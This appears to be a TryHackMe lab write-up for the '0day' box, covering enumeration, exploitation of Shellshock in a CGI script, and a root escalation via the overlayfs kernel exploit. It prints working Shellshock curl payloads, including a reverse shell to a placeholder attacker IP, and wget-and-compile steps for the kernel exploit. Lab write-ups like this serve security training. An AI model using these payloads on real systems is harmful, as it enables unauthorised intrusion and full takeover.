# 0day\TryHackMe

**OS:** Ubuntu 14.04 | **Kernel:** 3.13.0-32

---

## Nmap

```bash
nmap -sV -sC 10.130.158.179
```

Two ports open , SSH on 22 and Apache 2.4.7 on 80. Apache version is old, worth digging into.

---

## Gobuster

```bash
gobuster dir -u http://10.130.158.179/ -w /usr/share/wordlists/dirb/common.txt
```

Found `/backup` with an encrypted RSA key, and `/cgi-bin` throwing 403. Old Apache and cgi-bin i figured it was Shellshock. Ran gobuster again on it:

```bash
gobuster dir -u http://10.130.158.179/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi
```

Found `test.cgi`.

---

## Shellshock (CVE-2014-6271)

```bash
# confirm vuln
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://10.130.158.179/cgi-bin/test.cgi

# reverse shell
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'sh -i >& /dev/tcp/MY_IP/9909 0>&1'" http://10.130.158.179/cgi-bin/test.cgi
```

Got a shell as `www-data`.

---

## Privesc — CVE-2015-1328 (overlayfs)

Kernel was 3.13.0-32 on Ubuntu 14.04 , old enough for a kernel exploit.

```bash
searchsploit 3.13.0
```

Grabbed `37292.c`. gcc couldn't find cc1 on the target so fixed PATH first:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Transferred and compiled on the target:

```bash
# attacker
python3 -m http.server 8080

# target
cd /var/tmp
wget http://MY_IP:8080/37292.c
gcc 37292.c -o exploit && ./exploit
```

Root.
